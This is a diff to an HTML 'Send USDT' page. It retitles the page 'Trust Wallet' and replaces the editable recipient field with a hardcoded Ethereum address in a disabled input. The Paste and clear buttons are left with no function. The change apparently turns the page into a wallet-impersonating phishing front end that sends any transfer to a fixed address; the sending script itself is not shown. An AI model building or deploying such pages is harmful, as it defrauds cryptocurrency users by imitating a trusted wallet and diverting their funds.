@@ -2,28 +2,27 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Send USDT</title>
-  <link rel="stylesheet" href="style.css">
-  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Trust Wallet</title>
+  <link rel="stylesheet" href="style.css" />
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js"></script>
 </head>
-<body>
+<body onload="showUSDTLiveValue()">
   <div class="container">
-    <label for="address">Address or Domain Name</label>
-    <div class="input-wrapper">
-      <input type="text" id="address" placeholder="Search or Enter" value="0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999">
-      <span style="cursor:pointer" onclick="clearAddress()">✕</span>
-      <span style="color:#002fff; cursor:pointer" onclick="pasteAddress()">Paste</span>
+    <label class="label">Address</label>
+    <div class="input-box">
+      <span class="cut">×</span>
+      <input type="text" value="0xaE1C1312cC81A63be62848F7a201dAeE013E7710" disabled />
+      <span class="paste">Paste</span>
     </div>
 
-    <label for="amount">Amount</label>
-    <div class="amount-wrapper">
-      <input type="number" id="amount" placeholder="USDT Amount" oninput="updateFiat()"/>
-      <span>USDT</span>
-      <span style="color:#002fff; cursor:pointer" onclick="fillMax()">Max</span>
+    <label class="label">Amount</label>
+    <div class="input-box">
+      <input type="number" placeholder="0.00" />
+      <span class="unit">USDT</span>
+      <span class="max">Max</span>
     </div>
-
-    <div class="amount-line" id="fiat">≈ $0.00</div>
+    <p id="live-usdt-amount">= $0.00</p>
 
     <button onclick="sendUSDT()">Next</button>
   </div>
